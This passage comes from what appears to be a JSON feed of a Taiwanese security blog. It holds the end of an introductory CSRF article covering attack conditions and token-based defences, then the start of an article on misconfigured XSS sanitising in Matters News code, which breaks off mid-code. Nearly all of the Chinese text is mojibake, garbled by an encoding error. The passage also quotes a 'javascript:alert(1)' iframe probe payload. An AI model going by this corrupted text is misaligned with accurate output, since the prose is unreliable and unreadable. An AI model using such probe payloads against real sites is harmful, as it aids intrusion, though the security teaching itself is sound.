<strong>A/pay?to=B</strong> ï¼Œé€™è£¡çš„ A å°±æ˜¯æŒ‡ A ç¶²ç«™ Domain ï¼Œç„¶å¾Œå»åŸ·è¡Œ Pay é€™å€‹å‹•ä½œçµ¦ B ï¼Œé€™å€‹æ”»æ“Šçš„ç ´ç¶»å°±æ˜¯å‰›å‰›å‰è¨€ä¾‹å­ä¸­æåˆ°çš„ï¼Œé€å‡ºè³‡æ–™çš„Domain ä¸åŒï¼Œå¦å¤–ï¼Œè²¼å¿ƒå°æé†’ï¼Œåœ¨æƒ¡æ„ç¶²ç«™ä¸­å°±ç®—åªæ˜¯æ»‘é¼ ç§»éåœ–ç‰‡ä¹Ÿå¯èƒ½æœƒåŸ·è¡Œæƒ¡æ„çš„ Javascript åƒè¬ä¸è¦è¦ºå¾—æˆ‘éƒ½ä¸é»å°±æ²’äº‹ã€‚</p>\n<p>é€šå¸¸ Hacker ç™¼ç¾ç¶²ç«™æœ‰æ¼æ´æ™‚ï¼Œéƒ½æœƒä»¥é‡‘æµåŠç«Šå–éš±ç§è³‡æ–™ç‚ºä¸»è¦æ”»æ“Šé¢å‘ï¼Œç•¢ç«Ÿ Hacker é™¤äº†åšèˆˆè¶£ä¹Ÿæ˜¯è¦åƒé£¯ï¼Œå› æ­¤ç•¶ç¶²ç«™åœ¨è¨­è¨ˆé—œæ–¼é‡‘æµåŠéš±ç§è³‡æ–™çš„æ¶æ§‹æ™‚éœ€è¦ç‰¹åˆ¥å°å¿ƒï¼Œ</p>\n<h2 id=\"hacker%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8csrf%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#hacker%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8csrf%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\">#</a> Hackerå¯¦éš›åˆ©ç”¨CSRFæ¼æ´æ¡ˆä¾‹</h2>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-request-forgery/p2.png\" alt=\"\"><br>\n<strong>photo by <a href=\"https://www.ithome.com.tw/news/139205\">https://www.ithome.com.tw/news/139205</a></strong></p>\n<p>é€™å€‹æ–°èæ˜¯ç¶“å…¸çš„ XSS èˆ‡ CSRF è¯å‹•çš„æ¼æ´ï¼Œ Hacker åœ¨æ³¨å…¥ XSS ä¹‹å¾Œï¼Œåªè¦é€ è¨ªè¢«æ³¨å…¥ XSS é é¢çš„æ˜¯ä¸»è¾¦å–®ä½ï¼Œ Hacker å¯åˆ©ç”¨ CSRF æ¼æ´æŠŠè‡ªå·±çš„è§’è‰²è®Šæ›´ç‚ºå”è¾¦å–®ä½ï¼Œè€Œç²å¾—å¯ä»¥å­˜å–ç¤¾åœ˜æ‰€æœ‰åŠŸèƒ½çš„æ¬Šé™ï¼ŒåŒ…æ‹¬åˆ©ç”¨ç¨‹å¼è®Šæ›´ä¸»è¾¦å–®ä½ PayPal å¸³è™Ÿçš„é›»å­éƒµä»¶ï¼Œé€™è¡¨ç¤ºä¹‹å¾Œé€™å€‹ç¤¾åœ˜èˆ‰è¾¦çš„å„ç¨®æ´»å‹•æ‰€æ”¶å–çš„æ¬¾é …ï¼Œéƒ½æœƒæµè½åˆ° Hacker æ‰€æŒ‡å®šçš„å¸³è™Ÿä¸­ï¼Œè€Œä¸”å› ç‚ºé›»å­éƒµä»¶è¢«è®Šæ›´ï¼Œæ‰€ä»¥ä¸»è¾¦å–®ä½ä¹Ÿä¸æœƒæ”¶åˆ°ä»»ä½•çš„éƒµä»¶é€šçŸ¥ã€‚</p>\n<p>ï¼Šå¦‚æœæ˜¯å° XSS ä¸äº†è§£çš„æœ‹å‹ï¼Œæ­¡è¿çœ‹æˆ‘çš„ç¬¬äºŒç¯‡æ–‡ç« å–” XD</p>\n<h3 id=\"%E9%81%94%E6%88%90-csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B%E4%B8%89%E8%A6%81%E7%B4%A0\"><a class=\"direct-link\" href=\"#%E9%81%94%E6%88%90-csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B%E4%B8%89%E8%A6%81%E7%B4%A0\">#</a> é”æˆ CSRFÂ æ”»æ“Šæµç¨‹ä¸‰è¦ç´ </h3>\n<ol>\n<li>æœ‰ä¸€å€‹å¯ä»¥è§¸ç™¼æƒ¡æ„è…³æœ¬çš„å‹•ä½œ</li>\n<li>åªä»¥å–®ä¸€æ¢ä»¶é©—è­‰ç¶²ç«™èº«ä»½ï¼Œä¾‹å¦‚ï¼šåªé©—è­‰ cookie æˆ– token</li>\n<li>æ²’æœ‰é©—è­‰æˆ–æ˜¯é©—è­‰çš„åƒæ•¸å¯ä»¥é æ¸¬ï¼ˆå›ºå®šçš„ cookie ï¼‰</li>\n</ol>\n<h2 id=\"%E5%A6%82%E4%BD%95%E9%98%B2%E7%AF%84-csrf\"><a class=\"direct-link\" href=\"#%E5%A6%82%E4%BD%95%E9%98%B2%E7%AF%84-csrf\">#</a> å¦‚ä½•é˜²ç¯„ CSRF</h2>\n<p>é˜²ç¯„ CSRF çš„é‡é»åœ¨æ–¼æ‰“ç ´ CSRF æ”»æ“Šæµç¨‹ä¸‰è¦ç´ ï¼Œ</p>\n<ol>\n<li>å¢åŠ æ‰€æœ‰æ•æ„Ÿå‹•ä½œçš„é©—è­‰æ–¹å¼ï¼Œä¾‹å¦‚ï¼šé‡‘æµã€æäº¤å€‹è³‡ ç­‰â€¦å¤šåŠ ä¸€é“é©—è­‰ç¢¼çš„æ©Ÿåˆ¶</li>\n<li>å¢åŠ ç„¡æ³•é æ¸¬çš„åƒæ•¸ï¼Œå¸¸è¦‹ä¸”æœ‰æ•ˆçš„é˜²ç¯„æ–¹å¼ä¾‹å¦‚ï¼š<strong>CSRF token (åœ¨é é¢çš„ form æˆ–æ˜¯ custom header è£¡é¢æ”¾ä¸€å€‹ token ä¸¦è¦æ±‚ client request è¦å¤¾å¸¶é€™å€‹ token )</strong></li>\n</ol>\n<h2 id=\"%E5%AF%A6%E4%BD%9C-csrf-token-%E9%82%8F%E8%BC%AF\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BD%9C-csrf-token-%E9%82%8F%E8%BC%AF\">#</a> å¯¦ä½œ CSRF TokenÂ é‚è¼¯</h2>\n<p><strong>å»ºç«‹</strong>ï¼šåœ¨ User æ‰“é–‹ç¶²é æ™‚ï¼ŒServer æœƒæ ¹æ“š User çš„èº«ä»½ç”Ÿæˆä¸€å€‹ Token ï¼Œå°‡ Token å­˜æ”¾åœ¨é é¢ä¸­ï¼ˆé€šå¸¸ç”Ÿæˆçš„åŸºç¤æ˜¯ User åç¨±åŠ ä¸Šéš¨æ©Ÿäº‚æ•¸æˆ–æ˜¯æ™‚é–“æˆ³è¨˜çš„åŠ å¯†çµ„åˆï¼Œå¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ Token éœ€è¦é¡å¤–æ”¾ç½®ï¼Œä¸èƒ½ä¾ç„¶å­˜æ”¾åœ¨ Cookie ä¸­ï¼Œä¸ç„¶ä¸€æ¨£æœƒè¢«æ•´åŒ…å¸¶èµ° ï¼Œå»ºè­°æ˜¯å­˜åœ¨ Server çš„ Sessionä¸­ï¼‰ã€‚</p>\n<p><strong>å‚³é€è«‹æ±‚</strong>ï¼šä¹‹å¾Œåªè¦æœ‰æ·»åŠ  Token çš„é é¢åœ¨æäº¤è«‹æ±‚æ™‚ï¼Œéƒ½éœ€è¦åŠ ä¸Šé€™å€‹Token ï¼Œè«‹æ±‚æ‰æœƒè¢«å…è¨±ï¼Œé€šå¸¸å°æ–¼GETè«‹æ±‚ï¼ŒTokenæœƒé™„åœ¨è«‹æ±‚çš„ç¶²å€ä¹‹å¾Œï¼Œé€™æ¨£ URL æœƒè®Šæˆ   <code>http://url?csrftoken=tokenvalue</code>è€Œ POST è«‹æ±‚å‰‡æœƒåœ¨ form çš„æœ€å¾ŒåŠ ä¸Šï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">&lt;input type=ã€Œhiddenã€ name=ã€Œcsrftokenã€ value=ã€Œtokenvalueã€/>`</code></pre>\n<p>æŠŠTokenä»¥åƒæ•¸çš„å½¢å¼åŠ å…¥è«‹æ±‚äº†ã€‚</p>\n<p><strong>é©—è­‰</strong>ï¼šç•¶ User ç™¼é€ç•¶æœ‰è«‹æ±‚çš„ Token çµ¦ Server æ™‚ï¼ŒServer ç‚ºäº†è¦ç¢ºå®š Token çš„æ™‚é–“æœ‰æ•ˆæ€§å’Œæ­£ç¢ºæ€§ï¼Œæœƒå…ˆè§£å¯† Tokenï¼Œå°æ¯”åŠ å¯†éå¾Œçš„ User åç¨±å’Œç•¶æ™‚çš„éš¨æ©Ÿäº‚æ•¸åŠæ™‚é–“æˆ³è¨˜ï¼Œå¦‚æœåŠ å¯†çš„è³‡æ–™ä¸€è‡´è€Œä¸”æ™‚é–“æˆ³è¨˜æ²’æœ‰éæœŸï¼ŒServer å°±æœƒé©—è­‰é€šéï¼Œç¢ºèª Token æ˜¯æœ‰æ•ˆçš„ã€‚</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>é™¤äº†åŠ ä¸Š CSRF Token åŠå¤šé‡é©—è­‰çš„é˜²ç¯„æ–¹å¼ä»¥å¤–ï¼Œç‚ºé¿å… CSRF é¢¨éšªï¼Œå»ºè­°åœ¨æ¯éšæ®µæ¶æ§‹å’Œè¨­è¨ˆæ™‚ï¼Œä½¿ç”¨ç¶“éå¯©æŸ¥çš„å¥—ä»¶æˆ–æ¡†æ¶ã€‚ ä½¿ç”¨è«¸å¦‚ owasp csrfguard ä¹‹é¡çš„å CSRF å¥—ä»¶å¯ä»¥é™ä½ç¶²é  CSRF çš„é¢¨éšªã€‚</p>\n<p>ä¹‹å¾Œæœƒå†å¦é–‹æ–‡ç« èªªæ˜ CSRF çš„å…„å¼Ÿ XSS èˆ‡ç¶²é å®‰å…¨ä¸‰æœ¬æŸ± Secure ã€ samsite ã€ httponly ä»–å€‘ä¹‹é–“ä¸å¾—ä¸èªªçš„æ•…äº‹ã€‚</p>\n<h2 id=\"%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\"><a class=\"direct-link\" href=\"#%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\">#</a> åè©è§£é‡‹</h2>\n<p><strong>è¨»1</strong>ï¼šcookieï¼šç”¨ä¾†è¨˜éŒ„Useråœ¨ç¶²ç«™ä¸Šçš„æ“ä½œåŠæ†‘è­‰ï¼Œå¤§å¤šæ•¸é›»å•†ç¶²ç«™ï¼Œå¦‚PChomeç­‰éƒ½æœƒä½¿ç”¨ cookie ä¾†ç´€éŒ„ç¶²é ä¸Šçš„çš„æ“ä½œè³‡è¨Šï¼Œå¸¸è¦‹çš„æ˜¯ç´€éŒ„è³¼ç‰©è»Šã€æœƒå“¡ç™»å…¥æˆ–ç€è¦½ç´€éŒ„ã€åœç•™æ™‚é–“ç­‰ï¼Œè®“Webå¯ä»¥è­˜åˆ¥ç”¨æˆ¶çš„èº«åˆ†ï¼ŒUserç™»å…¥éå¾Œï¼Œå¯ä»¥ç„¡éœ€å†æ¬¡ç™»å…¥å°±å¯ä»¥ç›´æ¥é€²è¡Œæ“ä½œï¼Œã€‚</p>\n<p><strong>è¨»2</strong>ï¼šdomainï¼šæŒ‡çš„æ˜¯ç¶²åŸŸåç¨±ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ç¶²ç«™çš„åœ°å€ï¼Œå°±å¦‚åŒä½å®¶åœ°å€ä¸€èˆ¬ï¼Œå¯„ä¿¡çš„æ™‚å€™å¯ä»¥è®“å°æ–¹çŸ¥é“ä¿¡æ˜¯å¾å“ªè£¡å¯„ä¾†çš„ã€‚</p>\n<p>ç†±é¨°é¨°çš„XSSæ–‡ç« å‡ºçˆå•¦ï½</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> å»¶ä¼¸é–±è®€</h2>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆäºŒï¼‰-èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">èªè­˜ XSS(Cross-Site Scripting</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> åƒè€ƒè³‡æ–™</h2>\n<blockquote>\n<p><a href=\"https://blog.techbridge.cc/2017/02/25/csrf-introduction/\">https://blog.techbridge.cc/2017/02/25/csrf-introduction/</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://kknews.cc/zh-tw/tech/veqpbna.html\">https://kknews.cc/zh-tw/tech/veqpbna.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\">https://zh.wikipedia.org/wiki/è·¨ç«™è«‹æ±‚å½é€ </a></p>\n</blockquote>\n",
      "date_published": "2021-05-26T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/",
      "title": "é˜²æ­¢ XSS å¯èƒ½æ¯”æƒ³åƒä¸­å›°é›£",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<p>å¦‚æœä½ ä¸çŸ¥é“ä»€éº¼æ˜¯ XSSï¼ˆCross-site Scriptingï¼‰ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯é§­å®¢å¯ä»¥åœ¨ä½ çš„ç¶²ç«™ä¸Šé¢åŸ·è¡Œ JavaScript çš„ç¨‹å¼ç¢¼ã€‚æ—¢ç„¶å¯ä»¥åŸ·è¡Œï¼Œé‚£å°±æœ‰å¯èƒ½å¯ä»¥æŠŠä½¿ç”¨è€…çš„ token å·èµ°ï¼Œå‡é€ ä½¿ç”¨è€…çš„èº«ä»½ç™»å…¥ï¼Œå°±ç®—å·ä¸èµ° tokenï¼Œä¹Ÿå¯ä»¥ç«„æ”¹é é¢å…§å®¹ï¼Œæˆ–æ˜¯æŠŠä½¿ç”¨è€…å°åˆ°é‡£é­šç¶²ç«™ç­‰ç­‰ã€‚</p>\n<p>è¦é˜²æ­¢ XSSï¼Œå°±å¿…é ˆé˜»æ­¢é§­å®¢åœ¨ç¶²ç«™ä¸Šé¢åŸ·è¡Œç¨‹å¼ç¢¼ï¼Œè€Œé˜²ç¦¦çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚èªªå¯ä»¥é€é CSPï¼ˆContent-Security-Policyï¼‰é€™å€‹ HTTP response header é˜²æ­¢ inline script çš„åŸ·è¡Œæˆ–æ˜¯é™åˆ¶å¯ä»¥è¼‰å…¥ script çš„ domainï¼Œä¹Ÿå¯ä»¥ç”¨ <a href=\"https://web.dev/trusted-types/\">Trusted Types</a> é˜²æ­¢ä¸€äº›æ½›åœ¨çš„æ”»æ“Šä»¥åŠæŒ‡å®šè¦å‰‡ï¼Œæˆ–æ˜¯ä½¿ç”¨ä¸€äº›éæ¿¾ XSS çš„ libraryï¼Œä¾‹å¦‚èªª <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a> ä»¥åŠ <a href=\"https://github.com/leizongmin/js-xss\">js-xss</a>ã€‚</p>\n<p>ä½†æ˜¯ç”¨äº†é€™äº›å°±èƒ½æ²’äº‹äº†å—ï¼Ÿæ˜¯ä¹Ÿä¸æ˜¯ã€‚</p>\n<p>å¦‚æœä½¿ç”¨æ­£ç¢ºé‚£ç•¶ç„¶æ²’æœ‰å•é¡Œï¼Œä½†è‹¥æ˜¯æœ‰ç”¨å¯æ˜¯è¨­å®šéŒ¯èª¤çš„è©±ï¼Œé‚„æ˜¯æœ‰å¯èƒ½å­˜åœ¨ XSS çš„æ¼æ´ã€‚</p>\n<!-- summary -->\n<p>å‰é™£å­æˆ‘å‰›å¾å…¬å¸å…§è½‰åˆ°ä¸€å€‹åšè³‡å®‰çš„åœ˜éšŠ <a href=\"https://cymetrics.io/zh-tw\">Cymetrics</a>ï¼Œåœ¨å°ä¸€äº›ç¶²ç«™åšç ”ç©¶çš„æ™‚å€™ç™¼ç¾äº†ä¸€å€‹ç¾æˆçš„æ¡ˆä¾‹ï¼Œå› æ­¤é€™ç¯‡å°±ä»¥é€™å€‹ç¾æˆçš„æ¡ˆä¾‹ä¾†èªªæ˜æ€æ¨£å«åšéŒ¯èª¤çš„è¨­å®šï¼Œè€Œé€™å€‹è¨­å®šåˆæœƒå¸¶ä¾†ä»€éº¼æ¨£çš„å½±éŸ¿ã€‚</p>\n<!-- summary -->\n<h2 id=\"%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C\">#</a> éŒ¯èª¤çš„è¨­å®šï¼Œæ„æ–™ä¹‹å¤–çš„çµæœ</h2>\n<p><a href=\"https://matters.news/\">Matters News</a> æ˜¯ä¸€å€‹å»ä¸­å¿ƒåŒ–çš„å¯«ä½œç¤¾ç¾¤å¹³å°ï¼Œè€Œä¸”æ‰€æœ‰çš„ç¨‹å¼ç¢¼éƒ½æœ‰<a href=\"https://github.com/thematters\">é–‹æº</a>ï¼</p>\n<p>åƒæ˜¯é€™ç¨®éƒ¨è½æ ¼å¹³å°ï¼Œæˆ‘æœ€å–œæ­¡çœ‹çš„æ˜¯ä»–å€‘æ€éº¼è™•ç†å…§å®¹çš„éæ¿¾ï¼Œç§‰æŒè‘—å¥½å¥‡è·Ÿç ”ç©¶çš„å¿ƒæ…‹ï¼Œå¯ä»¥ä¾†çœ‹çœ‹ä»–å€‘åœ¨æ–‡ç« è·Ÿè©•è«–çš„éƒ¨åˆ†æ˜¯æ€éº¼åšçš„ã€‚</p>\n<p>Server éæ¿¾çš„ç¨‹å¼ç¢¼åœ¨é€™é‚Šï¼š<a href=\"https://github.com/thematters/matters-server/blob/bf49f129eb63acaab707609f6a12fced7aaf0f4c/src/common/utils/xss.ts\">matters-server/src/common/utils/xss.ts</a>ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">import</span> xss <span class=\"token keyword\">from</span> <span class=\"token string\">'xss'</span><br><br><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">onIgnoreTagAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">tag<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> value<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">/**<br>   * Allow attributes of whitelist tags start with \"data-\" or \"class\"<br>   *<br>   * @see https://github.com/leizongmin/js-xss#allow-attributes-of-whitelist-tags-start-with-data-<br>   */</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string\">'data-'</span> <span class=\"token operator\">||</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// escape its value using built-in escapeAttrValue function</span><br>    <span class=\"token keyword\">return</span> name <span class=\"token operator\">+</span> <span class=\"token string\">'=\"'</span> <span class=\"token operator\">+</span> xss<span class=\"token punctuation\">.</span><span class=\"token function\">escapeAttrValue</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\"'</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">ignoreTagProcessor</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><br>  <span class=\"token parameter\">tag<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span><br>  html<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span><br>  options<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">[</span>key<span class=\"token operator\">:</span> string<span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> any <span class=\"token punctuation\">}</span></span><br><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tag <span class=\"token operator\">===</span> <span class=\"token string\">'input'</span> <span class=\"token operator\">||</span> tag <span class=\"token operator\">===</span> <span class=\"token string\">'textarea'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> xssOptions <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  whiteList<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span><span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>  onIgnoreTagAttr<span class=\"token punctuation\">,</span><br>  onIgnoreTag<span class=\"token operator\">:</span> ignoreTagProcessor<span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><br><span class=\"token keyword\">const</span> customXSS <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xss<span class=\"token punctuation\">.</span>FilterXSS</span><span class=\"token punctuation\">(</span>xssOptions<span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">sanitize</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">string<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> customXSS<span class=\"token punctuation\">.</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span></code></pre>\n<p>é€™é‚Šæ¯”è¼ƒå€¼å¾—æ³¨æ„çš„æ˜¯é€™ä¸€æ®µï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>é€™ä¸€æ®µå°±æ˜¯å…è¨±è¢«ä½¿ç”¨çš„ tag è·Ÿå±¬æ€§ï¼Œè€Œå±¬æ€§çš„å…§å®¹ä¹Ÿæœƒè¢«éæ¿¾ã€‚ä¾‹å¦‚èªªé›–ç„¶å…è¨± iframe è·Ÿ src å±¬æ€§ï¼Œä½†æ˜¯ <code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code> æ˜¯è¡Œä¸é€šçš„ï¼Œå› ç‚ºé€™ç¨® <code>javascript:</code> é–‹é ­çš„ src æœƒè¢«éæ¿¾æ‰ã€‚</p>\n<p>åªçœ‹ server side çš„æ²’æœ‰ç”¨ï¼Œé‚„éœ€è¦çœ‹ client side é‚£é‚Šæ˜¯æ€éº¼ render çš„ã€‚</p>\n<p>å°æ–¼æ–‡ç« çš„é¡¯ç¤ºæ˜¯é€™æ¨£çš„ï¼š<a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/views/ArticleDetail/Content/index.tsx\">src/views/ArticleDetail/Content/index.tsx</a>ï¼‰</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><br>  <span class=\"token operator\">&lt;</span>div<br>    className<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token function\">classNames</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <span class=\"token string\">'u-content'</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> translating <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><br>    dangerouslySetInnerHTML<span class=\"token operator\">=</span><br>    onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>captureClicks<span class=\"token punctuation\">}</span><br>    ref<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>contentContainer<span class=\"token punctuation\">}</span><br>  <span class=\"token operator\">/</span><span class=\"token operator\">></span><br><br>  <span class=\"token operator\">&lt;</span>style jsx<span class=\"token operator\">></span><span class=\"token punctuation\">{</span>styles<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span><br><span class=\"token operator\">&lt;</span><span 